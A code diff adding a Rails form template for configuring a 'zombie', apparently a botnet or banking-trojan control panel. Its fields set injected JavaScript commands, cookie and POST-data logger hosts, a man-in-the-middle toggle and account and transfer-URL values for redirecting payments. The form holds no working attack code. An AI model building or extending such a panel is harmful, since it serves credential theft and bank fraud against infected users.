@@ -1,0 +1,82 @@
+<%= form_for([@zombie, @zombie.ccconfig]) do |f| %>
+  <div class="field">
+    <%= f.label :jscommand %><br />
+    <%= f.text_field :jscommand , :size => 150  %>
+  </div>
+
+  <div class="field">
+    <%= f.label :jscommandid %><br />
+    <%= f.number_field :jscommandid %>
+  </div>
+  <div class="field">
+    <%= f.label :balancepage %><br />
+    <%= f.text_field :balancepage, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :checksslvar %><br />
+    <%= f.check_box :checksslvar %>
+  </div>
+  <div class="field">
+    <%= f.label :loginhost %><br />
+    <%= f.text_field :loginhost, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :cookieloggerhost %><br />
+    <%= f.text_field :cookieloggerhost, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :cookieloggingenabled %><br />
+    <%= f.check_box :cookieloggingenabled %>
+  </div>
+  <div class="field">
+    <%= f.label :enablemitm %><br />
+    <%= f.check_box :enablemitm %>
+  </div>
+  <div class="field">
+    <%= f.label :logoutpostdata %><br />
+    <%= f.text_field :logoutpostdata %>
+  </div>
+  <div class="field">
+    <%= f.label :modifyurl %><br />
+    <%= f.text_field :modifyurl, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :myaccount %><br />
+    <%= f.text_field :myaccount %>
+  </div>
+  <div class="field">
+    <%= f.label :newaccount %><br />
+    <%= f.text_field :newaccount %>
+  </div>
+  <div class="field">
+    <%= f.label :origaccount %><br />
+    <%= f.text_field :origaccount %>
+  </div>
+  <div class="field">
+    <%= f.label :origmsg %><br />
+    <%= f.text_field :origmsg, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :postdataloggerhost %><br />
+    <%= f.text_field :postdataloggerhost, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :postenabled %><br />
+    <%= f.check_box :postenabled %>
+  </div>
+  <div class="field">
+    <%= f.label :cookielist %><br />
+    <%= f.text_field :cookielist, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :transferurl %><br />
+    <%= f.text_field :transferurl, :size => 150  %>
+  </div>
+  <div class="field">
+    <%= f.label :uploadpath %><br />
+    <%= f.text_field :uploadpath, :size => 150  %>
+  </div>
+  <div class="actions">
+    <%= f.submit %>
+  </div>
+<% end %>
